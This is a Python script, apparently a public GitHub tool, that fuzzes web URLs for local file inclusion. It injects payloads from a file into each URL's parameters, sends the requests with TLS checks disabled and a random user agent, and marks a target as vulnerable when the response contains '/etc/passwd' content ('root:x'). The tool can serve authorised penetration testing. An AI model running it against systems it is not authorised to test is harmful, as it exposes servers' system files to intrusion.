#!/usr/bin/python3
#script by mux0x
import exurl
import requests
from termcolor import colored
from tqdm import tqdm
import random
import urllib3
import argparse


def logo():
    print(colored('''\n\n 

                                        /$$$$$$           
                                       /$$$_  $$          
     /$$$$$$/$$$$  /$$   /$$ /$$   /$$| $$$$\ $$ /$$   /$$
    | $$_  $$_  $$| $$  | $$|  $$ /$$/| $$ $$ $$|  $$ /$$/
    | $$ \ $$ \ $$| $$  | $$ \  $$$$/ | $$\ $$$$ \  $$$$/ 
    | $$ | $$ | $$| $$  | $$  >$$  $$ | $$ \ $$$  >$$  $$ 
    | $$ | $$ | $$|  $$$$$$/ /$$/\  $$|  $$$$$$/ /$$/\  $$
    |__/ |__/ |__/ \______/ |__/  \__/ \______/ |__/  \__/

''', 'red', attrs=[]))
    print(colored('                      [+] LFI FUZZER', 'cyan', attrs=['bold']))
    print(colored('                      [+] github @mux0x', 'cyan', attrs=['bold']))
    print("")
    print(colored('########################################################################', 'green', attrs=[]))
    print("")

logo()

parser = argparse.ArgumentParser()
parser.add_argument("-l", "--list", help="list of links --list urls.txt")
parser.add_argument("-u", "--user_agents", help="file containing list of user agents -u useragents.txt")
parser.add_argument("-o", "--output", help="output file containing the vulnerable links")
parser.add_argument("-p", "--payloads", help="file containing list of payloads")
args = parser.parse_args()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
user_agenta = tuple(open(args.user_agents, 'r'))
user_agents = [w.replace('\n', '') for w in user_agenta]
user_agent_random =random.choice(user_agents)


def injecting():
    urls_list = tuple(open(args.list, 'r'))
    payloads_list = tuple(open(args.payloads, 'r'))
    for ind,payload in enumerate(payloads_list):
        locals()["listurls" + str(ind)] = exurl.split_urls(urls_list, payload)
        with open('lfi_output', 'a') as f:
            for item in locals()["listurls" + str(ind)]:
                f.write("%s\n" % item)
                locals()["listurls" + str(ind)] = None
    urls_list = None
    payloads_list = None
def send_request(line):
    line = line.rstrip()
    headers = {"User-Agent": str(user_agent_random)}
    try:
        r = requests.get(line, headers=headers, verify=False, timeout=15)
        content = r.content
        if b"root:x" in content:
            print(colored("\n\n[+] Vulnerable :> ", 'red') + line + "\n")
            m = open(args.output, "a")
            m.write(line + "\n")
            m.close()
    except KeyboardInterrupt:
        exit()
    except Exception as error:
        print(line, error)

injecting()


with open('lfi_output') as f:
   for line in f:
        send_request(line)
